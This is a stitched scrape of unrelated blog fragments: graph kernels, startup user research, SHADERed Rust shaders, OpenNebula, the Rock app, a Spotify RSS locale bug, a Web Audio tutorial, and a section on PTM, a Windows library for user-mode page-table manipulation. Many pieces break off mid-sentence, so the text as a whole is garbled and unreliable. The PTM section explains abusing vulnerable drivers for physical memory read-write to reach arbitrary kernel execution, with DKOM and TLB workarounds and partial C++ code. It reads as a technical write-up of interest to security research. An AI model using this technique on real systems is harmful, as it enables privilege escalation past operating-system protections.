<p>If this has whet your appetite, I invite you to <a href="http://proceedings.mlr.press/v97/rieck19a/rieck19a.pdf">read our
paper</a> or <a href="https://github.com/BorgwardtLab/P-WL">take
a look at the code</a>. If you want
to learn more about graph classification using graph kernels, take
a look at our <a href="https://arxiv.org/abs/2011.03854">recent survey on graph kernels</a>,
which will hopefully be officially announced in time for NeurIPS 2020.
In the best tradition of Fermat, I would very much like to cover the
content of the survey here, but this blog is too small to contain all of
it—maybe for a subsequent post?</p>
<p>Until next time!</p>

Sort of.</p><p id="d494">Our mission was compelling as we launched to <a href="https://www.inc.com/magazine/201806/leigh-buchanan/missionu-career-training-school.html" rel="noopener">fanfare</a> and raised <a href="https://techcrunch.com/2017/09/14/missionu-raises-8-5m-to-build-an-alternative-one-year-education-program/" rel="noopener">$11.5M</a> within 10 months of founding the company. However, after just two years we were acqui-hired, our investors got their money back, and the product was immediately <a href="https://www.insidehighered.com/digital-learning/article/2018/05/23/missionu-self-styled-alternative-higher-education-closes-after" rel="noopener">shut down</a>.</p><p id="6863">I was gutted, still am TBH.</p><p id="0f28">But with hindsight, I could look back to my original research notes and see I had ignored several fatal warnings. I had listened to what they said — exactly as they said it, but I did not realize until much later that I failed to actually understand what they meant.</p><p id="9305">So if I wanted to avoid failing a third time, I needed to figure out what I was missing about how to <em>really</em> understand users.</p><p id="9c98">Marty Cagan, Silicon Valley Product Group founder and former PM at early eBay, says there are “<a href="https://svpg.com/the-inconvenient-truth-about-product/" rel="noopener">two inconvenient truths about product</a>.”</p><p id="b881">Truth #1: <strong>At least half of our ideas are just not going to work</strong>:</p><p id="ed0c">Truth #2: <strong>Even the good ideas take several iterations to become viable.</strong></p><p id="3d8c">My experience has also been that there’s simply no escaping these inconvenient truths — I only wish I would have learned about them sooner.</p><p id="30d3">It doesn’t matter how smart or experienced we may be, statistically speaking, most of our ideas are simply not going to work. And the successful ones take time and hard work to turn into a real product that gets widely adopted by a market.</p><p id="de93">Your ideas are not nearly as important as your process — and the best process starts with understanding what the customers you wish to serve <em>already</em> do to solve their problems today and even more importantly, understanding why.</p><p id="9883">Yet, even as a 3rd time founder, I fell into the trap of ignoring the two inconvenient truths <em>again.</em></p><p id="87c7">Confirmation bias is a hell of a drug.</p><p id="f8b7">When we started <a href="http://grain.co/?utm_source=medium" rel="noopener">grain.co</a> two years ago, we began with a specific product solution in mind, built prototypes, and got feedback from users. They told us they’d love to use it but after months turning prototypes into a product, few actually did.</p><p id="a400">So we started over from scratch, but this time with a different approach:</p><ol><li id="2be7">Focus on a very specific user type with a very specific job to be done.</li><li id="bb56">Interview dozens of them only to understand how and why they solve their problem today.</li></ol><p id="0128">Our goal was not to validate whether the merit of a specific solution but to observe existing customer behaviors and desires as a means of generating new ideas for potential product solutions.</p><p id="3dec">This is what is known as <strong>generative research</strong>.</p><p id="4699">As you listen to your target market describe what they do today to solve their problems, you can better understand potential customers’ existing incentives, behaviors, and desires in anticipation for how they’d react to a new solution.</p><p id="331b"><a href="https://twitter.com/robfitz" rel="noopener">Rob Fitzpatrick</a> has famously coined this generative research phase “ <a href="http://momtestbook.com/" rel="noopener">The Mom Test</a>,” which is a set of simple rules to ask good questions so that even your Mom can’t lie to you in her answers to protect your ego.</p><p id="7e65">Generative research questions are focused on understanding existing behavior. For example, here are some questions from an interview guide we used at <a href="http://grain.co/" rel="noopener">Grain</a> to understand how our prospective users already document and share information from live meetings:</p><ul><li id="fcb3">What’s your current process to document and share information from a video meeting?</li><li id="fa1f">How important is it that the information you document and share is accurate?</li><li id="6568">What measures do you currently take to ensure accuracy of captured information?</li><li id="33f9">What can happen if your documentation is inaccurate?</li><li id="32f3">How often are you in conversations where you don’t need to document or share anything?</li><li id="cda6">Which types of conversations are the most important for you to document and share?</li></ul><p id="9e72">Be sure to avoid hypothetical questions about what people <em>might</em> do. Don’t try to validate your future product with questions that begin with “would you use this” or “what do you think about the possibility of” — that’s what we call leading the witness, and it will inevitably bias your data and waste your time building the wrong thing. At this stage, you simply need to observe what users are <em>already doing,</em> not what they might theoretically do.</p><figure><div></div></figure><p id="69d3">I recently connected with <a href="https://twitter.com/robfitz" rel="noopener">Rob</a> where he shared an updated model of 3 ways where users will lie to you if you’re not careful:</p><ol><li id="afa0">Asking the wrong questions</li><li id="6697">Remembering the wrong thing</li><li id="6a57">Making the wrong decision “justified” by what you think you heard</li></ol><p id="ecb1">Rob and most other researchers suggest asking for permission from their interviewees to record these interviews and take time-annotated notes that will help them to accurately remember and codify behavioral patterns that could eventually help to define <a href="https://www.uxmatters.com/mt/archives/2019/02/the-pitfalls-of-personas-and-advantages-of-jobs-to-be-done.php" rel="noopener">“jobs to be done”</a> that product, engineering, and design teams can build for with confidence.</p><p id="556d">After gaining insights about the problems your target market faces in generative research, you may be confident enough to test out a specific product solution to see if these users would actually value it.</p><p id="4717">This is the concept behind <strong>evaluative testing</strong>.</p><p id="f326">At this early stage, you want to put an <em>ultra-lightweight implementation </em>of a product solution in front of your target users to see how they react. While the closer to reality your prototype is the better, it doesn’t need to be a fully functional product yet: designs on paper, prototypes, mock-ups-anything like that will work.</p><p id="b1b0">Your goal at this stage is to get clear qualitative signals that users:</p><ol><li id="9f21">understand the proposed product solution</li><li id="fcda">express unmistakable excitement about the prospect of the product as a superior solution to the status quo</li></ol><p id="2033">Unfortunately, all too many product teams speed through this testing or skip it all together and simply march ahead to engineering and delivery. Depending on the complexity of the market and the problem you’re trying to solve, this stage could take months or, in some cases, years.</p><p id="d10d">That might sound discouraging and time-consuming, but I know this for certain: the success of your product will be <strong><em>directly proportiona</em>l</strong> to the quality of work done in this initial customer discovery phase. It’s worth doing it, and it’s certainly worth doing it well.</p><p id="0fd4">Even if your team creates something that people want, if customers can’t figure out how to use it, the product is dead in the water. This is why product teams conduct usability testing throughout the build process.</p><p id="ee09">The traditional approach to usability interviews is to set up a test environment, where we watch as a user navigates the product. An interviewer encourages a user to explain what they see, think, and observe. The interviewer also offers prompts for what the user might consider next if they get stuck using the product. Usability issues in the product become self-evident in most of these cases.</p><p id="8825">My friend <a href="https://medium.com/u/b2d49a9606e3?source=post_page-----c68feaecac44--------------------------------" target="_blank" rel="noopener">Behzod Sirjani</a>, has created a framework for conducting usability testing interviews where he recommends asking the participant about their:</p><ol><li id="084d">Expectation (about what will happen)</li><li id="4d83">Reaction (to what happens)</li><li id="64e1">Reflection (on the difference between 1 and 2)</li></ol><figure><div></div></figure><p id="ec98">A less scientific and more agile approach to identifying lower-hanging usability issues is concierge onboarding. In concierge onboarding, someone from your team guides — via video call is best — new users through setting up the product and answers the questions in real-time. Concierge onboarding helps the team member understand the steps users are asked to take and the ways those steps directly lead to value.</p><figure><div></div></figure><p id="2293">In a recent Zoom call with Behzod, he told me how at Slack it was essential to turn usability interviews into video highlights of moments of user struggle to help his team form a shared understanding of the problem and gain alignment around solutions that will actually work.</p><p id="5379">The best product teams never stop this work of generative and evaluative testing for new features. Even as their initial research and testing turns into a real product, they know the importance of creating a customer discovery and product delivery engine that never stops learning and growing.</p><p id="b7d9">It’s much more common for product teams to continually learn and discover from their existing users than it is for them to gather insights from completely unbiased non-users. But a balance between the two groups — existing and new — is ideal. New users can give you a better understanding of your initial product experience, and existing “power users” can offer you insights that come from living with a product for weeks or months.</p><p id="1af9">Great product teams develop long-standing relationships of trust with their most active users. You’ll often see the people on these teams setting up recurring feedback sessions to gain insight and listen to users’ concerns and ideas. The point of these interviews is to find out what’s delightful and what’s frustrating, what’s there and working well, and …</p></div></div></div>

<h2><b>Embark Studios</b></h2>
<p>I am thrilled to announce the newest SHADERed sponsor, <a href="https://embark-studios.com/">Embark Studios</a>. Embark Studios is a games studio based in Stockholm. They are heavily interested in <a href="https://www.embark.dev/">open-source</a> and <a href="https://medium.com/embarkstudios/inside-rust-at-embark-b82c06d1d9f4">Rust</a>. I definitely recommend you to visit their <a href="https://embark-studios.com/">website</a> and read more about the projects and games they are working on: <a href="https://medium.com/embarkstudios/our-continued-journey-89dad7a76bff">Medium article</a>.</p>
<p>I would also like to thank Embark Studios for the support!</p>
<p><img alt="Embark Studios" src="https://shadered.org/assets/blog/img/4/EmbarkSponsor.png"></p>
<h2><b>Rust shaders on web</b></h2>
<p>Almost two weeks ago I released a plugin for desktop version of SHADERed that adds the ability to write the shaders in Rust programming language. Getting that plugin to work might be difficult if you are new to Rust. Plus, if you just wanted to see how Rust shaders work and test out the syntax, it would be a hassle to set everything up (though I do recommend you to check out Rust!). I thought it would be nice if I brought them to the web, a place where everyone can try them out without having to install additional software. So, today I would like to extend the support for Rust shaders to SHADERed Lite - the web version of SHADERed.</p>
<p>This embedded shader below is 100% written in Rust. It is running in realtime and it's hosted on shadered.org:</p>


<p>You can test your changes on the "Quick edit" page without having to load the full SHADERed Lite IDE:</p>
<p><img alt="Rust quick edit" src="https://shadered.org/assets/blog/img/4/RustQuickEdit.gif"></p>
<p>Or you can press the "Fork" button to open the shader in 'Lite' version of SHADERed. There you can modify the project more extensively (add new variables, geometry objects, shader passes, textures, etc...):</p>
<p><img alt="Forking Rust project" src="https://shadered.org/assets/blog/img/4/RustFork.gif"></p>
<p>After you are done with your shader, you can upload it to shadered.org database so that everyone can see the shader in action and the code behind it (note that you must be logged in to upload it):</p>
<p><img alt="Rust shaders" src="https://shadered.org/assets/blog/img/4/RustShaders.png"></p>
<p>If you want to save it to your computer, hit the <code>File</code> -&gt; <code>Download</code> button and SHADERed will download the .zip file containing your project (for this action you do not have to be logged in). You can also save the SPIR-V binary of your Rust shaders through SHADERed Lite.</p>
<p><i>How does all of this work?</i><br>
I've set up a special server that I send Rust code to. The server then gives me back the build status, error messages and generated SPIR-V. The compile times are around ~1 second. Though, on first few days of launch it might be slower due to higher traffic. Be aware that the first ever compile takes very long, around 10 seconds or so. This is because the compiler has to build some additional Rust crates. But I've designed the server so that it creates a 'session' for the user so that even when you close your browser and then reopen it, the next build time will be ~1 second (the compiler won't have to build those additional crates again).<br>
I still recommend you to use the <a href="https://shadered.org/plugin?id=Rust">plugin</a> (if you've got everything set up required by <a href="https://github.com/EmbarkStudios/rust-gpu">rust-gpu</a>). This way you'll get the fastest possible compile times and you won't depend on any servers.<br>
All of this is possible thanks to this <strong>awesome <a href="https://github.com/EmbarkStudios/rust-gpu">rust-gpu</a> project</strong> made by Embark Studios! It is fully open source!</p>

<h2><b>Other changes</b></h2>
<p>Besides adding Rust shaders to the web version of SHADERed, I am also <strong>bringing the C++/Circle shaders to the web</strong> and I made some smaller changes to the website.</p>
<h3><b>C++ shaders in your browser</b></h3>
<p>The C++ shader addition to SHADERed Lite is currently more of an experiment. The <a href="https://shadered.org/circle-lang.org">circle</a> compiler sometimes crashes and sometimes the SPIR-V it produces causes the spirv-cross to throw an exception (and thus SHADERed Lite stops working). The compile times are also pretty long since I have to run the compiler in a virtualized environment (because of the <code>@meta</code>).</p>
<p>Since this is basically C++ you <em>should be able</em> to use stuff such as templates, std::complex, etc...</p>
<p><img alt="C++ shaders" src="https://shadered.org/assets/blog/img/4/CppShaders.png"></p>
<p>Similarly to Rust shaders, I definitely recommend you to rather use the <a href="https://shadered.org/plugin?id=CPP">plugin</a> (that is if you have Linux). The plugin doesn't require any additional software and the compile times are blazingly fast, they are almost instantaneous (unlike on the web version of SHADERed).<br>
Check out the <strong> <a href="https://shadered.org/circle-lang.org">circle</a> project </strong> that made this possible and it's creator <a href="https://twitter.com/seanbax">Sean Baxter</a>.</p>
<p><img alt="C++ shaders" src="https://shadered.org/assets/blog/img/4/CppAutoRecompile.gif"></p>
<h3><b>Website changes</b></h3>
<p>Some smaller changes include:</p>
<ul>
<li>
<p>new syntax highlighting in the "Quick edit" page<br>
<img alt="New syntax highlighting" src="https://shadered.org/assets/blog/img/4/NewSyntaxHighlight.png"><br></p>
</li>
<li>
<p>'<code>Save SPIR-V binary</code>' option<br>
<img alt="Saving SPIR-V from within browser" src="https://shadered.org/assets/blog/img/4/SaveSPIRV.gif"><br></p>
</li>
<li>
<p>added the <a href="https://shadered.org/theme?id=vsdark">VSDark</a> theme<br>
<img alt="New VSDark theme" src="https://shadered.org/assets/blog/img/4/NewVSDarkTheme.png"><br></p>
</li>
<li>
<p>added sponsors to the loading page of SHADERed Lite<br>
<img alt="Sponsors" src="https://shadered.org/assets/blog/img/4/Sponsors.png"><br></p>
</li>
<li>
<p>notification button now shows the number of unread notifications:<br>
<img alt="Updated notifications" src="https://shadered.org/assets/blog/img/4/Notifications.png"><br></p>
</li>
<li>
<div><p>the compiler used on the "Quick Edit" page is now 4 times lighter, so now when you hit the "Compile" button for the first time it should hopefully load the compiler <code>.js</code> file faster.</p></div>
</li>
</ul>
<h3><b>Terminal plugin</b></h3>
<p>Another thing worth mentioning is probably the <a href="https://shadered.org/plugin?id=Terminal">terminal plugin</a>. This plugin lets you open terminal (PowerShell, CMD, WSL) windows inside SHADERed. While mostly useless for shader development, it lets you (for example) run the actual Vim within SHADERed<br>
<img alt="Vim and SHADERed" src="https://shadered.org/assets/blog/img/4/UsingVim.gif"><br></p>
<p>
If you would also like to sponsor/support the development, consider becoming a <a href="https://patreon.com/dfranx">patron</a> or <a href="https://shadered.org/contact">contacting</a> me.</p>	</div></div>]]>

<p>Today we are happy to announce a new, powerful <a rel="noreferrer noopener" href="https://opennebula.io/true-hybrid/" target="_blank">True Hybrid Cloud Architecture</a> for OpenNebula. This reference architecture is composed of hybrid clusters that can run <strong>any workload</strong>, both virtualized and containerized, on <strong>any resource</strong>, physical or virtual, <strong>anywhere</strong>, on-premises and on the cloud.</p>



<p>Our <strong>True Hybrid Cloud Architecture</strong> implements enterprise-grade features for performance, availability and scalability with <strong>a very simple design</strong> that enables workload portability across geographic distributed clusters, <strong>avoids vendor lock-in</strong> and reduces complexity, resource consumption and operational costs across the board.</p>







<div><figure><img src="https://opennebula.io/wp-content/uploads/2020/12/Consolidated-Infra-Cluster.png" alt="" width="661" height="398"></figure></div>







<p>Now more than ever, IT departments need the right blend of on-premises, public and edge cloud environments to support the collection of existing and emerging use cases. They also need to <strong>combine virtual machine workloads with application containers in a shared environment</strong> that can offer the best of both worlds—mature virtualization technology and secure container orchestration.</p>



<p>Over a decade’s worth of experience working with hundreds of users and customers has helped us define a <strong>True Hybrid Cloud Architecture</strong> that is much simpler than the traditional cloud computing architectures made of complex, proprietary general-purpose software systems for storage and networking. This one builds upon storage and networking technologies that already exist in the Linux operating system and modern storage hardware that are available from existing cloud and edge providers, leading to a greatly simplified design.</p>



<p>The <strong>True Hybrid Cloud Architecture</strong> will be the recommended and <a rel="noreferrer noopener" href="https://opennebula.io/true-hybrid/" target="_blank">commercially supported cloud configuration</a> for hybrid and edge computing with OpenNebula. While support for this architecture won’t be available to the general public until the next version of OpenNebula (due in January 2021), in the following days we are announcing the delivery of cloud deployment services, enterprise support and managed services for <strong>OpenNebula 5.12 </strong>clouds<strong> </strong>based on this innovative architecture. You can enjoy a <strong>single vendor experience</strong> with a <strong>complete cloud stack fully supported and managed by OpenNebula Systems</strong>. This ultimately affords a simplified experience for procurement, consulting, support and management.</p>

                  There are different reasons why this has happened, but one of the main reasons is that the way we work hasn't really changed. When companies started shifting their workforce to a remote model, they took the tools they were already using (e.g. Slack, Zoom) and sent their employees home.
                </p>
                <p>
                  These tools are now being used in the same way they were used in the office, where most of the interaction happened in real-time.

                  <b>This is where <a href="http://rock.so/">Rock</a> comes in</b>. <a href="https://www.linkedin.com/in/liming/">Ming</a> and I started building Rock about a year ago to make it easier to shift towards a <a href="http://rock.so/about">more asynchronous way of working</a>. This way of working gives you <b>more control</b> over your workday, makes you <b>more productive</b> while <b>reserving face-to-face meetings</b> for the most important things. It's also ideally suited to a workforce that is more distributed.
                </p>
                <p>
                  With the right tools and mindset, working with your team becomes more like a <b>relay race</b>. Everybody knows what's going on, you can pick things up when you're ready, and work happens in a state of flow.

              <div>
                <p>
                  Rock combines real-time messaging and video calls with more asynchronous ways of communicating like <a href="http://rock.so/tasks">tasks</a>, <a href="http://rock.so/notes">notes</a>, and <a href="http://rock.so/files">files</a> and makes this available in <a href="http://rock.so/product">one space</a>. Because we combine these different types of communication, we make it easy for you to pick and choose the best way to interact with your team. We also work with Google Drive (and will work with Zoom and others soon) so it's easier to tap into your existing workflows.
                </p>
                <p>
                  When you <a href="http://rock.so/better-than-slack">compare Rock to Slack</a> you can easily see why we think Rock just works better for how work happens today.

		<p>I fixed a bug that sporadically made Spotify remove my show, <a target="_blank" href="https://gettingsimple.com/podcast">the Getting Simple podcast</a>, from its platform without any logical explanation and, more worrisome, without warnings or notifications.</p>
<hr>
<p>Some time ago, I noticed the podcast's RSS feed displayed episode release dates localized in Chinese and other languages. Something that, to my eyes, seemed random. Yesterday, I finally identified the issue.</p>
<p>The XML feed is cached for thirty minutes at a time — a duration I set to avoid overloading the server by re-generating the feed on every request.</p>
<p>But this feed re-generation used the requesting party's "locale." This code corresponds to the language and region configured in the system that performs a web request. For instance, the <code>en-US</code> locale represents a visitor or bot configured to use the English language and the United States region. A localized site — that can adjust its content to different locales — would display a date as <code>Wed, 02 Dec 2020</code> for <code>en-US</code> visitors and as <code>Mié., 02 Dic. 2020</code> for <code>es-ES</code> visitors.</p>
<pre><code>date('D, d M Y H:i:s O');
// returns "Wed, 02 Dec 2020 05:19:14 -0500"
</code></pre>
<p>This <code>date('D, d M Y H:i:s O')</code> PHP method uses the operating system's language and region to determine what to display, but a localized website can adjust to the visitor's locale or even comply with explicit requirements.</p>
<pre><code>App::setLocale('en-US'); // force locale to en-US

Item::formatDate(Date::now(), 'D, d M Y H:i:s O')
// returns "Wed, 02 Dec 2020 05:22:55 -0500"

App::setLocale('es-ES'); // force locate to es-ES

Item::formatDate(Date::now(), 'D, d M Y H:i:s O')
// returns "Mié., 02 Dic. 2020 05:22:55 -0500"
</code></pre>
<p>The issue was that the re-generation of the podcast feed was dependent on the requesting agent's locale when the cache expired, which could be any user or bot. Spotify was pinging the podcast and could load a feed generated by an agent that used a locale other than English in the past thirty minutes.</p>
<pre><code>App::setLocale('en-US');
// Generate episode timestamps here
</code></pre>
<p>When Spotify found dates were not in English, it removed the show altogether—something that Apple Podcasts and other networks didn't do—and then added the podcast back hours later, when episode dates were in English again.</p>
<p><img src="https://nono.imgix.net/folio/images/veil.gif" data-src="https://nono.imgix.net/img/u/post-why-spotify-removed-my-show-player.png" alt="Spotify player showing a Getting Simple episode."></p><p>Spotify took its time to reload all existing episodes after forcing the localization of episode timestamps to use the <code>en-US</code> locale and re-generating the feed. Now all episodes and their stats are back. Hopefully, the show won't disappear again, and users won't hit this ugly, erroring embedded player.</p>

              <p>While there's not much we can do to compensate this effect, this experiment allows to draw two key conclusions:</p>

              <ol>
                <li>You need to <b>🏋️ work at 100%</b> of your abilities to even stand a chance.</li>

              </ol>

              <p>Another interesting observation is that successful people are probably not even aware of their own survivorship bias: they just feel it's all been hard work.</p>

<hr>
<p>PTM is a Windows 10 C++ library that allows a programmer to manipulate all memory, physical, and virtual from user-mode. The project inherits an interface from VDM allowing the use of a physical memory read-write primitive to fuel this project. VDM is used solely to configure the page tables in such a way that PTM can manage them from user-mode. Once the page tables are configured for PTM VDM is no longer required. However, VDM can inherit an instance of PTM as a means to read and write physical memory. Both VDM and PTM work extremely well together and independently from each other.</p>

<hr>
<p>Page table manipulation is an extremely powerful primitive. One that allows groundbreaking projects to be created such as patching the kernel only in specific process-contexts, or mapping of a source process address space into a target process address space. PTM is a user-mode library that allows a programmer to manipulate page tables from user-mode on 64-bit Windows 10 systems. PTM does this by using VDM; a project designed to abuse vulnerable drivers exposing a physical memory read-write primitive (RWP) to elevate to arbitrary kernel execution. VDM is used to configure the page tables in such a way that they can be managed from user-mode without the need for VDM’s vulnerable driver being loaded into the kernel after initialization. PTM can then be used to get and set all levels of page table entries, translation linear virtual addresses from user-mode, map physical memory into virtual memory, and even create new page tables. PTM can also be used as a means to directly read and write physical memory, thus it can be used with VDM to leverage arbitrary kernel execution without the need of VDM’s vulnerable driver being loaded into the kernel.</p>

<hr>
<p>Paging is the concept of breaking memory into fixed-sized chunks called pages. Pages can be moved in and out of physical memory allowing for memory that is not accessed frequently to be moved to disk. In order for this to work, the CPU cannot directly interface with physical memory instead the CPU interfaces with virtual memory. Virtual addresses are translated to physical addresses using a set of tables called page tables. On a 64-bit system with the CPU in long mode, there are four layers of page tables: PML4(s), PDPT(s), PD(s), and lastly PT(s). All page tables are the same size (1000h bytes) unless configured otherwise. Each page table entry is eight bytes in size. This means that each table contains 512 entries (8 * 512 = 1000h). The last twelve bits of every virtual address is called the page offset and is an offset into a physical page. The page offset of a virtual address can be bigger than 12 bits depending on the paging structure configuration for a given virtual address. The length of the page offset field can be either 12 bits (physical page is 4kB), 21 bits (2MB physical page), or 30 bits (1GB page).</p>
<p><img src="https://imgur.com/IqB4B22.png"></p><p>In order to translate linear virtual addresses to linear physical addresses, the page tables must be traversed. As depicted in figure one, each virtual address space has its own PML4, the physical address of this table is stored in CR3.</p>

<hr>
<p>On Windows, the thread scheduler utilizes KPROCESS.DirectoryTableBase when scheduling threads. The KPROCESS structure is a substructure of the EPROCESS structure and contains DirectoryTableBase at offset 28h. A programmer using VDM can obtain the linear physical address of the PML4 of a process easily by DKOM’ing a desired process KPROCESS structure.</p>
<pre><code>kd&gt; dt !_KPROCESS ffffc38759d9e080
nt!_KPROCESS
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 ProfileListHead  : _LIST_ENTRY 
   +0x028 DirectoryTableBase : 0x00000001`15684000
   +0x030 ThreadListHead   : _LIST_ENTRY 
   +0x040 ProcessLock      : 0
   +0x044 ProcessTimerDelay : 0
   +0x048 DeepFreezeStartTime : 0
</code></pre><p>Once the physical address of the desired processes PML4 has been obtained the trick is interfacing with the paging structures. Although VDM allows reading and writing of physical memory, be aware that MmMapIoSpace cannot be used to map the paging structures into virtual memory. Drivers that use MmCopyMemory and ZwMapViewOfSection to interface with physical memory can however be used to directly manipulate the page tables. To properly support VDM which PTM inherits as a codebase, the project does not rely on the physical read and write primitive exposed from the driver. Instead PTM allocates its own set of page tables and inserts a PML4E into the current processes PML4 pointing at such tables. This allows a programmer to map physical memory at will into the current virtual memory address space, all from user-mode. In other words, once the tables are allocated and configured, there is no need for VDM anymore since the paging tables can be controlled entirely from user-mode.</p>

<hr>
<p>The translation look-aside buffer is a hardware-based cache that assists in translating linear virtual addresses to linear physical addresses. The TLB caches virtual to physical address translations, as well as other information like page access rights and cache type information. Although extremely important for efficiency, the TLB has made PTM an interesting challenge. For example, when physical memory is mapped into a virtual address space, page table entries will be inserted, or changed. This insertion or alteration of an existing page table entry may be of a cached entry in the TLB. This means that the effects applied to the page table entry will not be seen until the TLB entry for the given virtual page has been invalidated, along with the changes written to main memory. To counteract this, the CPU has an instruction that allows a programmer to invalidate a page table entry in the TLB’s cache. This instruction is called INVLPG and is a privileged instruction. It’s not something PTM can use since the library is designed to operate entirely from user-mode. Directly invalidating TLB is not the only way to invalidate entries. If a page fault occurs, the TLB invalidates entries for the given address that caused the fault (the address in CR2). This is an effective method for invalidating desired virtual addresses from user-mode but is extremely slow. Context switches do not inherently cause the TLB to flush, rather the PCID is changed to another PCID. This allows the TLB to retain entries from multiple address spaces and improve performance. However, yielding execution can invalidate TLB entries because the scheduler will reschedule the logical processor to execute somewhere else for some time, possibly filling the TLB with other entries and removing the ones that were previously cached.</p>
<h3 id="tlb_outrun"><a href="#tlb_outrun">TLB - Outrun</a></h3>
<hr>
<p>Although the TLB is an effective hardware-based cache, it cannot cache linear virtual addresses that have not been accessed before, this simple fact means a programmer can create a new linear virtual address every single time they would want to map a new physical page into virtual memory. This, however, is not a solid solution that works soundly on all modern CPUs. With the industry pushing forward with virtualization technology, the expansion of the TLB continues. Thus solely generating a new linear virtual address every time you would want to interface with a physical page is not a sound solution and is already unstable on most modern AMD chips. Instead combining this technique with other techniques is ideal.</p>
<div><pre><code data-lang="cpp"><span>auto</span> ptm_ctx<span>::</span>map_page(<span>void</span><span>*</span> addr) <span>-&gt;</span> <span>void</span><span>*</span>
{
	<span>++</span>pte_index;
	<span>if</span> (pte_index <span>&gt;</span> <span>511</span>)
	{
		<span>++</span>pde_index;
		pte_index <span>=</span> <span>0</span>;
	}

	<span>if</span> (pde_index <span>&gt;</span> <span>511</span>)
	{
		<span>++</span>pdpte_index;
		pde_index <span>=</span> <span>0</span>;
	}

	<span>if</span> (pdpte_index <span>&gt;</span> <span>511</span>)
		pdpte_index <span>=</span> <span>0</span>;

	<span>// insert paging table entries down here…
</span><span></span>	<span>//... (refer to PTM repo to see that code)...
</span><span></span>	<span>// returns the newly generated virtual address...
</span><span></span>	<span>return</span> <span>get_virtual_address</span>();
}
</code></pre></div><p>The code above generates a new linear virtual address that has not been accessed before. This linear virtual address points to the requests physical page in memory. This allows the programmer to circumvent the TLB by accessing new linear virtual addresses instead of trying to invalidate TLB entry of an existed and already cached page. This however has limitations since the code only provides 512^3 different possible virtual pages.</p>
<h3 id="tlb_benefit_of_the_doubt"><a href="#tlb_benefit_of_the_doubt">TLB - Benefit of The Doubt</a></h3>
<hr>
<p>Although outrunning the TLB is the fastest solution for mapping physical memory into virtual memory without needing to invalidate any TLB entries, it is not the most stable on modern hardware. Instead, a mixture of generating a new virtual address and an SEH try/except loop is preferred. By giving the new virtual address the benefit of the doubt that it has not been cached yet, an attempt to access the newly created page is performed. If the access is successful, the new linear virtual address is returned to the caller of ptm::ptm_ctx::map_page. However, if the access causes a page fault, the TLB invalidates the entries associated with this newly created linear virtual address. The except block then attempts to access the new page in a loop whilst yielding execution at each failure to access the new virtual address. This technique provides the most performant solution to dealing with the TLB from user-mode. This method guarantees that the linear virtual address generated is accessible before returning it to the caller.</p>
<div><pre><code data-lang="cpp"><span>auto</span> ptm_ctx<span>::</span>get_virtual_address() <span>const</span> <span>-&gt;</span> <span>void</span><span>*</span>

December 2, 2020 | https://ui.dev/web-audio-api/ | <a href="https://web.archive.org/web/*/https://ui.dev/web-audio-api/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p> <iframe src="https://www.youtube.com/embed/laCjGMhASp8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""> </iframe> </p>
<p>The Web Audio API is incredibly powerful, with great support in every modern browser. It gives web developers tools to add effects to audio, create audio visualizations, generate audio, and much more.</p>
<p>Today, we’ll be diving into the basics of the Web Audio API by creating a soundboard which allows us to click a button on the web page and play a synthesized sound. We’ll generate sound effects for a drum kit, along with a few melodic tones.</p>
<p>Portions of this article were adapted from <a href="https://dev.opera.com/articles/drum-sounds-webaudio/" rel="nofollow">this article</a> by Chris Lowis.</p>
<h2>How does the Web Audio API work?</h2>
<p><img src="https://ui.dev/post-images/modules.jpg" alt="Modules"></p>
<p>The Web Audio API is based on the concept of modular routing, which has its roots in analog synthesizers. There are audio <em>sources</em>, such as microphones, oscillators, and audio files, which provide some kind of audio signal.</p>
<p>Those audio signals can be connected to other audio nodes which perform operations with that signal. These nodes include the Gain Node, which can raise or lower the volume of a signal; Filter Nodes, which changes how the signal sounds; and an Analyser Node, which provides real-time information about a signal which can be used to render a visualization.</p>
<p>Finally, our audio signal is passed to an output node, which plays the signal through our computer’s speakers.</p>
<p>Analog synthesizers use wires and circuits to create the audio nodes and connections; with the Web Audio API, we use code.</p>
<h2>A Primer on Computer Audio</h2>
<p>Sounds works through continuous waves in the air which our ears are able to detect. These waves move at varying frequencies, which our brain interprets as different pitches. Higher frequencies mean higher pitch. The height of each peak in the wave indicates its amplitude, or power. Waves with a high amplitude are interpreted by our brains as higher volume.</p>
<p>If you want to learn more about waveforms, you should check out <a href="https://pudding.cool/2018/02/waveforms/" rel="nofollow">this excellent primer</a> by Josh Comeau.</p>
<p>The problem with computers is they can’t process or store continuous data; computer processors can only handle one bit of data at any moment. That means when working with audio in a computer, we actually use discrete signals, which take the continuous signal and convert it into a sequence of samples, each representing what the frequency and amplitude of the signal was at that moment in time.</p>
<p>This is why the sample rate is so important to audiophiles - the more samples you can fit into a second of audio, the more accurate the representation is. However, it isn’t a 1-to-1 match of signal frequency to sample rate. For example, the range of human hearing is 20 - 20,000 Hertz (Hz). To capture enough samples to represent that range of frequencies, you actually need more than double the source frequency. That’s why the sample rate of CDs is 44,100 Hz, or 44,100 samples per second. This is also the default sample rate for the Web Audio API.</p>
<p>You might also have two streams of audio are stored together, such as in a stereo audio clip. The separate streams are called channels, and in stereo they correspond to the left and right speakers. If your audio has 5.1 surround sound, then it would have 6 separate channels: front left and right, center, back left and right, and the subwoofer.</p>
<h2>The AudioContext</h2>
<p>All of the work we do in the Web Audio API starts with the AudioContext. This is an object that gives us access to all of the other objects and constructors that we’ll use as we create audio. You can think of it like <code>document</code> or a canvas context, but for Web Audio.</p>
<p>We create the audio context using the <code>AudioContext()</code> constructor.</p>
<div data-language="js"><pre><code><span>const</span> audioContext <span>=</span> <span>new</span> <span>AudioContext</span><span>(</span><span>)</span><span>;</span></code></pre></div>
<p>Not every browser has full support for the Web Audio API. If you want to make your audio application work for all browsers, check out <a href="https://developer.mozilla.org/en-US/docs/Web/Guide/Audio_and_video_delivery/Web_Audio_API_cross_browser" rel="nofollow">this article on MDN</a> for some helpful tips.</p>
<h2>Generating Audio in JavaScript</h2>
<p>Since the Web Audio API is used in a JavaScript environment, audio has to be stored in a way that JavaScript can understand. This is done using audio buffers, which can be created with the <code>.createBuffer</code> method on the audio context. We have to pass it the number of channels in the buffer, the number of samples that the buffer holds, and the sample rate.</p>
<div data-language="js"><pre><code><span>const</span> <span>SAMPLE_RATE</span> <span>=</span> audioContext<span>.</span>sampleRate<span>;</span>
<span>const</span> timeLength <span>=</span> <span>1</span><span>;</span> 

